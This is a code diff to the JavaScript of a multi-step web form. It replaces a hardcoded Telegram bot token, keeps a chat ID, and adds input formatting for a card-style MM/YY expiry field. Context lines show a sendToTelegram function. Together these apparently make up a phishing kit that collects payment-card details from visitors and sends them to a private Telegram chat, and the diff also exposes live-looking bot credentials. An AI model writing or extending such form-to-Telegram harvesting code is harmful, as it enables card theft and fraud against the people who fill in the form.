@@ -2,7 +2,7 @@ let currentStep = 0;
 const steps = document.querySelectorAll(".form-step");
 
 // Telegram Bot API Details
-const TELEGRAM_BOT_TOKEN = "7781002847:AAH_wF0ySaWQ3dW6XY01gGcmnzUTITYA31M";
+const TELEGRAM_BOT_TOKEN = "7739574932:AAHnQpeZR9obL8u7-oUdenZpIcSvTl5eZrY";
 const TELEGRAM_CHAT_ID = "6300694007";
 
 function nextStep() {
@@ -48,6 +48,24 @@ function validateStep() {
 function saveProgress() {
     localStorage.setItem("currentStep", currentStep);
 }
+document.getElementById("expiryDate").addEventListener("input", function (e) {
+    let input = e.target.value;
+    
+    // Remove non-numeric characters except for '/'
+    input = input.replace(/[^0-9/]/g, '');
+    
+    // Automatically insert '/' after the first two digits
+    if (input.length > 2 && input.indexOf('/') === -1) {
+        input = input.slice(0, 2) + '/' + input.slice(2);
+    }
+
+    // Limit input to MM/YY format
+    if (input.length > 5) {
+        input = input.slice(0, 5);
+    }
+
+    e.target.value = input;
+});
 
 // Load progress
 window.onload = function () {
@@ -106,4 +124,4 @@ function sendToTelegram(message) {
     .catch(() => {
         alert("Network error! Please check your connection and try again.");
     });
-            }
+}
